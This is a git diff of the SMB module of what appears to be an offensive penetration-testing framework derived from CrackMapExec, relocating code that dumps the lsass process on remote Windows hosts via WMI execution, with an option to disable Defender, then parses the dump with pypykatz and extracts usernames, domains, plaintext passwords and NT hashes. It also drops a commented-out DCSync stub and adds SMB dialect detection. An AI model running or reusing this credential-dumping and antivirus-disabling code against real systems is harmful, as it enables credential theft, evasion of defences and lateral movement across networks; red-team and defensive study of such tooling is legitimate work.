@@ -149,7 +149,7 @@ class smb(connection):
         smb_parser.add_argument("-tgt", '--tgticket', metavar="TGT", dest='tgt', nargs='+', default=[], help='KerberosTGT')
         smb_parser.add_argument("-tgs", '--tgservice', metavar="TGS", dest='tgs', nargs='+', default=[], help='KerberosTGS')
         smb_parser.add_argument("-dc", '--domaincontroller', type=str, default='', help='the IP of a domain controller')
-        smb_parser.add_argument('--logs', action='store_true', help='Logs all results')
+        smb_parser.add_argument('-logs', '--logs', action='store_true', help='Logs all results')
         smb_parser.add_argument('-v', '--verbose', action='count', default=0, help='Set verbosity level up to 5, -v -vv -vvvvv')
 
         igroup = smb_parser.add_mutually_exclusive_group()
@@ -484,83 +484,6 @@ class smb(connection):
         except Exception as e:
             logging.debug('b {}'.format(str(e)))
 
-
-    @requires_admin
-    def dump(self):
-        """Procdump lsass."""
-
-        if self.args.kd:
-            killDefender = True
-        else:
-            killDefender = False
-
-        try:
-            exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender, self.logger)
-            logging.debug('Dumping lsass using wmiexec')
-        except:
-            self.logger.error('Failed to initiate wmiexec')
-            logging.debug('Error launching shell via wmiexec, traceback:')
-            logging.debug(format_exc())
-            return
-
-        try:
-            dumpFile = exec_method.dump()
-        except Exception as e:
-            logging.debug('dump failed because: {}'.format(str(e)))
-
-        if dumpFile:
-            self.parsedump(dumpFile)
-
-
-    def parsedump(self, dumpfile):
-        # Inspiration by @HackAndDo aka Pixis for these parse bits
-        from pypykatz.pypykatz import pypykatz
-        from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
-        from contextlib import redirect_stdout
-        import io
-
-
-        # hacky BS cause i'm dumb
-        class dum( object ):
-            pass
-
-        arg = dum()
-        setattr(arg, 'outfile', False)
-        setattr(arg, 'json', False)
-        setattr(arg, 'grep', False)
-        setattr(arg, 'kerberos_dir', False)
-        setattr(arg, 'recursive', False)
-        setattr(arg, 'directory', False)
-
-
-        out = pypykatz.parse_minidump_file(dumpfile)
-
-        f = io.StringIO()
-        with redirect_stdout(f): # Hides output
-            LSACMDHelper().process_results({"dumpfile": out}, [], arg)
-
-        credentials = self.parse_output(f.getvalue())
-
-        self.logger.highlight("Results:")
-        for credential in credentials:
-            self.logger.highlight(" %s\\%s:%s" % credential)
-
-
-    def parse_output(self, output):
-        import re
-        regex = r"(?:username:? (?!NA)(?P<username>.+)\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
-        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
-        credentials= []
-        for match in matches:
-            domain = match.group("domain")
-            username = match.group("username")
-            password = match.group("password") or match.group("hash")
-            if len(password) > 128:
-                # its not a password or hash, probably a kerb pass
-                pass
-            else:
-                credentials.append((domain, username, password))
-        return set(credentials)
 
 
 ###############################################################################
@@ -1301,9 +1224,18 @@ class smb(connection):
         elif dialect == impacket.smb3structs.SMB2_DIALECT_21:
             self.smbv = '2.1'
             logging.debug("SMBv2.1 dialect used")
-        else:
+        elif dialect == impacket.smb3structs.SMB2_DIALECT_30:
             self.smbv = '3.0'
             logging.debug("SMBv3.0 dialect used")
+        elif dialect == impacket.smb3structs.SMB2_DIALECT_302:
+            self.smbv = '3.0.2'
+            logging.debug("SMBv3.0.2 dialect used")
+        elif dialect == impacket.smb3structs.SMB2_DIALECT_311:
+            self.smbv = '3.1.1'
+            logging.debug("SMBv3.1.1 dialect used")
+        else:
+            self.smbv = '??'
+            logging.debug("SMB version couldnt be determined?")
 
         # Get the DC if we arent local-auth and didnt specify
         if not self.args.local_auth and self.dc_ip == '':
@@ -1395,7 +1327,7 @@ class smb(connection):
             pass
         return
 
-    def shares2(self): #session error not defined?
+    def shares(self): #session error not defined?
         from cmx.protocols.smb.ENUM.hostenum import shares1
         try:
             shares1(self)
@@ -1404,7 +1336,7 @@ class smb(connection):
         return
 
 
-    def shares(self):
+    def shares2(self):
         """Enum accessable shares and privileges.
 
         Prints output
@@ -1461,13 +1393,13 @@ class smb(connection):
 
 ###############################################################################
 
-     #     # ####### #######        ####### #     # #     # #     # 
-     ##    # #          #           #       ##    # #     # ##   ## 
-     # #   # #          #           #       # #   # #     # # # # # 
-     #  #  # #####      #    #####  #####   #  #  # #     # #  #  # 
-     #   # # #          #           #       #   # # #     # #     # 
-     #    ## #          #           #       #    ## #     # #     # 
-     #     # #######    #           ####### #     #  #####  #     # 
+     #     # ####### #######        ####### #     # #     # #     #
+     ##    # #          #           #       ##    # #     # ##   ##
+     # #   # #          #           #       # #   # #     # # # # #
+     #  #  # #####      #    #####  #####   #  #  # #     # #  #  #
+     #   # # #          #           #       #   # # #     # #     #
+     #    ## #          #           #       #    ## #     # #     #
+     #     # #######    #           ####### #     #  #####  #     #
 
 
 ###############################################################################
@@ -1720,44 +1652,84 @@ class smb(connection):
             NTDS.finish()
 
 
-#    def dcsync(self):
-#        try:
-#            stringBinding = r'ncacn_ip_tcp:{}[445]'.format(self.dc_ip)
-#            transport = impacket.dcerpc.v5.transport.DCERPCTransportFactory(stringBinding)
-#            transport.set_connect_timeout(5)
-#            dce = transport.get_dce_rpc()
-#            dce.connect()
-#            try:
-#                dce.bind(MSRPC_UUID_DRSUAPI)
-#                try:
-#                    resp = samr.hSamrLookupDomainInSamServer(dce)
-#                    if self.debug:
-#                        resp.dump()
-#                    domain_sid = resp['DomainId']
-#                    try:
-#                        resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
-#                        logging.debug('Dump of hSamrOpenDomain response:')
-#                        if self.debug:
-#                            resp.dump()
-#                        domainHandle = resp['DomainHandle']
-#
-#                    except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
-#                        logging.debug('a {}'.format(str(e)))
-#                        dce.disconnect()
-#                        pass
-#                except DCERPCException as e:
-#                    logging.debug('b {}'.format(str(e)))
-#                    dce.disconnect()
-#                    pass
-#            except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
-#                logging.debug('c {}'.format(str(e)))
-#                dce.disconnect()
-#                pass
-#        except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
-#            logging.debug('c {}'.format(str(e)))
-#            dce.disconnect()
-#            pass
 
+
+    @requires_admin
+    def dump(self):
+        """Procdump lsass."""
+
+        if self.args.kd:
+            killDefender = True
+        else:
+            killDefender = False
+
+        try:
+            exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender, self.logger)
+            logging.debug('Dumping lsass using wmiexec')
+        except:
+            self.logger.error('Failed to initiate wmiexec')
+            logging.debug('Error launching shell via wmiexec, traceback:')
+            logging.debug(format_exc())
+            return
+
+        try:
+            dumpFile = exec_method.dump()
+        except Exception as e:
+            logging.debug('dump failed because: {}'.format(str(e)))
+
+        if dumpFile:
+            self.parsedump(dumpFile)
+
+
+    def parsedump(self, dumpfile):
+        # Inspiration by @HackAndDo aka Pixis for these parse bits
+        from pypykatz.pypykatz import pypykatz
+        from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
+        from contextlib import redirect_stdout
+        import io
+
+
+        # hacky BS cause i'm dumb
+        class dum( object ):
+            pass
+
+        arg = dum()
+        setattr(arg, 'outfile', False)
+        setattr(arg, 'json', False)
+        setattr(arg, 'grep', False)
+        setattr(arg, 'kerberos_dir', False)
+        setattr(arg, 'recursive', False)
+        setattr(arg, 'directory', False)
+
+
+        out = pypykatz.parse_minidump_file(dumpfile)
+
+        f = io.StringIO()
+        with redirect_stdout(f): # Hides output
+            LSACMDHelper().process_results({"dumpfile": out}, [], arg)
+
+        credentials = self.parse_output(f.getvalue())
+
+        self.logger.highlight("Results:")
+        for credential in credentials:
+            self.logger.highlight(" %s\\%s:%s" % credential)
+
+
+    def parse_output(self, output):
+        import re
+        regex = r"(?:username:? (?!NA)(?P<username>.+)\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
+        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
+        credentials= []
+        for match in matches:
+            domain = match.group("domain")
+            username = match.group("username")
+            password = match.group("password") or match.group("hash")
+            if len(password) > 128:
+                # its not a password or hash, probably a kerb pass
+                pass
+            else:
+                credentials.append((domain, username, password))
+        return set(credentials)
 
 
 ####################################################################################
